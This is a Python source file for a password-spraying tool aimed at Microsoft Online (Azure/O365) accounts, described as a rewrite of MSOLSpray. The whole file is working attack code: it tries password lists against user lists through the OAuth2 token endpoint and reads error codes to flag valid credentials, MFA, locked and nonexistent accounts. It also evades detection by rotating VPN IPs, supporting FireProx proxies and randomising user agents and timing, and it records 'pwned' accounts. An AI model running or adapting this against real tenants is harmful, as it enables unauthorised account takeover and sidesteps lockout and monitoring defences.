import requests
import argparse
import time
import datetime
import sys
from nordvpn_switcher import initialize_VPN,terminate_VPN
from utils import configure_logger, make_session, random_time, userlist, passwordlist, targetlist, safe_rotate_vpn, get_public_ip, excptn, init_db, log_event, has_user_password_been_tested, has_user_been_pwned

def args_parse():
    description = """
    This is a pure Python rewrite of dafthack's MSOLSpray (https://github.com/dafthack/MSOLSpray/) which is written in PowerShell. All credit goes to him!

    This script will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
    """

    epilog = """
    EXAMPLE USAGE:
    This command will use the provided userlist and attempt to authenticate to each account with a password of Winter2020.
        python3 MSOLSpray.py --userlist ./userlist.txt --password Winter2020

    This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
        python3 MSOLSpray.py --userlist ./userlist.txt --password P@ssword --target https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox --out valid-users.txt
    """
    parser = argparse.ArgumentParser(description=description, epilog=epilog, formatter_class=argparse.RawDescriptionHelpFormatter)
    pass_group = parser.add_mutually_exclusive_group(required=True)
    user_group = parser.add_mutually_exclusive_group(required=True)
    sleep_group = parser.add_mutually_exclusive_group(required=False)
    user_group.add_argument('-U', '--userlist', help="emails list to use, one email per line")
    user_group.add_argument('-u', '--user', help="Single email to test")
    pass_group.add_argument('-p', '--password', help="Single password to test")
    pass_group.add_argument('-P', '--passwordlist', help="Password list to test, one password per line")
    pass_group.add_argument("--userAsPass", action=argparse.BooleanOptionalAction, help="Use username as password")
    sleep_group.add_argument('-s', '--sleep', type=int, help="Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0", default=0)
    sleep_group.add_argument('-r', '--random', nargs=2, type=int, metavar=('minimum_sleep', 'maximum_sleep'), help="Randomize the time between each authentication attempt. Please provide minimum and maximum values in seconds")
    parser.add_argument('-t', '--target', default="https://login.microsoft.com", help="The URL to spray against (default is https://login.microsoft.com). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
    parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password", default=False)
    parser.add_argument("-f", "--force", action=argparse.BooleanOptionalAction, help="Forces the spray to continue and not stop when multiple account lockouts are detected.")
    parser.add_argument("--vpn", action=argparse.BooleanOptionalAction, help="Use nord vpn to rotate IP")
    parser.add_argument('--skip-tested', action='store_true', help="Skip user:password already tried and logged in the DB")
    parser.add_argument('--ignore-success', action='store_true', help="Skip user already pwned in the DB")
    parser.add_argument("--vpn-area", default="Europe", help="VPN Zone(s) to use (ex: --vpn-area France,Germany,Netherlands,United Kingdom). Défaut: Europe.")
    return parser.parse_args()

def msol_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, max_sleep, vpn, area, initial_ip, skip_tested, ignore_success, userAsPass, force):
    working_creds_counter = 0  # zeroing the counter of working creds before starting to count
    username_counter = 0
    prev_ip = initial_ip
    lockout_counter = 0
    lockout_question = False
    total_attempts = len(usernames) * len(usernames if userAsPass else passwords) * len(targets)

    for target in targets:
        for username in usernames:
            if (userAsPass):
                    passwords = [username.split('@')[0]]
            for password in passwords:  # trying one password against each user, less likely to lockout users
                if ignore_success:
                    try:
                        already = has_user_been_pwned(username)
                    except Exception as e:
                        LOGGER.warning(f"[DB] Error during the user pwned check: {e}")
                        already = False  # en cas d'erreur, on choisit de ne pas bloquer le flux
                    if already:
                        LOGGER.info(f"[SKIP] {username} already pwned — skipping.")
                        continue
                    
                if skip_tested:
                    try:
                        already = has_user_password_been_tested(username, password)
                    except Exception as e:
                        LOGGER.warning(f"[DB] Error during the user:password check: {e}")
                        already = False  # en cas d'erreur, on choisit de ne pas bloquer le flux
                    if already:
                        LOGGER.info(f"[SKIP] {username}:{password} already tested — skipping.")
                        continue
                
                if vpn and username_counter%15==0:
                    new_ip = safe_rotate_vpn(area, prev_ip=prev_ip, rotate_retries=4)
                    if new_ip:
                        prev_ip = new_ip
                        LOGGER.debug(f"[VPN] Using IP {prev_ip}")
                    else:
                        LOGGER.warning("[VPN] Rotation failed — exiting")
                        sys.exit(1)

                body = {
                    'resource': 'https://graph.windows.net',
                    'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
                    'client_info': '1',
                    'grant_type': 'password',
                    'username': username,
                    'password': password,
                    'scope': 'openid',
                }

                headers = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/x-www-form-urlencoded',
                }

                session = make_session(random_ua=True)
                r = session.post(f"{target}/common/oauth2/token", headers=headers, data=body)
                ip = get_public_ip(timeout=5, retries=2)

                if r.status_code == 200:
                    LOGGER.info(f"SUCCESS! {username} : {password}")
                    log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="")
                    working_creds_counter += 1
                else:
                    resp = r.json()
                    error = resp["error_description"]

                    if "AADSTS50126" in error:
                        LOGGER.error(f"ERROR!: Invalid username or password. Username: {username} could exist.")
                        log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50126")

                    elif "AADSTS50128" in error or "AADSTS50059" in error:
                        LOGGER.error(f"WARNING! Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.")
                        log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50128")
                        
                    elif "AADSTS50034" in error:
                        LOGGER.error(f"WARNING! The user {username} doesn't exist.")
                        log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50034")
                                    
                    elif "AADSTS50079" in error or "AADSTS50076" in error:
                        # Microsoft MFA response
                        LOGGER.info(f"SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.")
                        log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="The response indicates MFA (Microsoft) is in use.")
                        working_creds_counter += 1
                        
                    elif "AADSTS50158" in error:
                        # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
                        LOGGER.info(f"SUCCESS! {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
                        log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="The response indicates conditional access (MFA: DUO or other) is in use.")
                        working_creds_counter += 1
                        
                    elif "AADSTS50053" in error:
                        # Locked out account or Smart Lockout in place
                        LOGGER.error(f"WARNING! The account {username} appears to be locked.")
                        log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50053")
                        lockout_counter += 1
                        
                    elif "AADSTS50057" in error:
                        # Disabled account
                        LOGGER.error(f"WARNING! The account {username} appears to be disabled.")
                        log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50057")
                        
                    elif "AADSTS50055" in error:
                        # User password is expired
                        LOGGER.info(f"SUCCESS! {username} : {password} - NOTE: The user's password is expired.")
                        log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="AADSTS50055")
                        working_creds_counter += 1
                        
                    else:
                        # Unknown errors
                        LOGGER.error(f"Got an error we haven't seen yet for user {username}")
                        log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="Got an error we haven't seen yet for user.")
                        LOGGER.error(error)
                session.close()

                if random is True:  # let's wait between attempts
                    sleep_time = random_time(min_sleep, max_sleep)
                    time.sleep(float(sleep_time))
                else:
                    time.sleep(float(sleep_time))

                username_counter += 1
                LOGGER.info(f"{username_counter} of {total_attempts} users tested")

                # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
                if not force and lockout_counter == 10 and lockout_question == False:
                    LOGGER.error("WARNING! Multiple Account Lockouts Detected!")
                    LOGGER.info("10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?")
                    yes = {'yes', 'y'}
                    no = {'no', 'n', ''}
                    lockout_question = True
                    choice = "X"
                    while(choice not in no and choice not in yes):
                        choice = input("[Y/N] (default is N): ").lower()

                    if choice in no:
                        LOGGER.info("Cancelling the password spray.")
                        LOGGER.info("NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled.")
                        break

                    # else: continue even though lockout is detected
    LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
    LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))


def main():
    args = args_parse()
    random = False
    min_sleep, max_sleep = 0, 0
    usernames, passwords, targets = [], [], []
    global LOGGER
    LOGGER = configure_logger(args.verbose, "MSOL")
    init_db("events.db")

    if args.userlist:
        try:
            usernames = userlist(args.userlist)
        except Exception as err:
            excptn(err)
    elif args.user:
        try:
            usernames = [args.user]
        except Exception as err:
            excptn(err)
    if args.password:
        try:
            passwords = [args.password]
        except Exception as err:
            excptn(err)
    elif args.passwordlist:
        try:
            passwords = passwordlist(args.passwordlist)
        except Exception as err:
            excptn(err)
        except Exception as err:
            excptn(err)
    if args.target:
            try:
                targets = [args.target]
            except Exception as err:
                excptn(err)
    elif args.targetlist:
        try:
            targets = targetlist(args.targetlist)
        except Exception as err:
            excptn(err)

    total_accounts = len(usernames)
    total_passwords = len(usernames if args.userAsPass else passwords)
    total_targets = len(targets)
    total_attempts = total_accounts * total_passwords * total_targets
    LOGGER.info("Total number of users to test: %s" % str(total_accounts))
    LOGGER.info("Total number of passwords to test: %s" % str(total_passwords))
    LOGGER.info("Total number of targets to test: %s" % str(total_passwords))
    LOGGER.info("Total number of attempts: %s" % str(total_attempts))
    LOGGER.info("Now spraying Microsoft Online.")
    LOGGER.info(f"Current date and time: {time.ctime()}")

    initial_ip = get_public_ip(timeout=5, retries=2)
    area = args.vpn_area or "Europe"

    if args.vpn:
        try:
            initialize_VPN(save=1, area_input=[area])
            LOGGER.debug(f"[VPN] initialized VPN on: {area} region(s)")
        except Exception as e:
            LOGGER.warning(f"[VPN] initialize_VPN failed at start: {e}")

        # --- NEW: capture initial IP and exit if unavailable ---
        prev_ip = initial_ip
        if not prev_ip:
            LOGGER.critical("[VPN] Could not determine initial public IP after VPN init. Exiting.")
            try:
                terminate_VPN()
            except Exception as e:
                LOGGER.warning(f"[VPN] terminate_VPN failed while exiting: {e}")
            sys.exit(1)
        else:
            LOGGER.info(f"[VPN] Initial public IP: {prev_ip}")

    if args.random:
        random = True
        min_sleep = args.random[0]
        max_sleep = args.random[1]

    msol_attempts(usernames, passwords, targets, args.sleep, random, min_sleep, max_sleep, 
                  args.vpn, area, initial_ip, args.skip_tested, args.ignore_success, args.userAsPass, args.force)

    if args.vpn:
        terminate_VPN()

if __name__ == "__main__":
    main()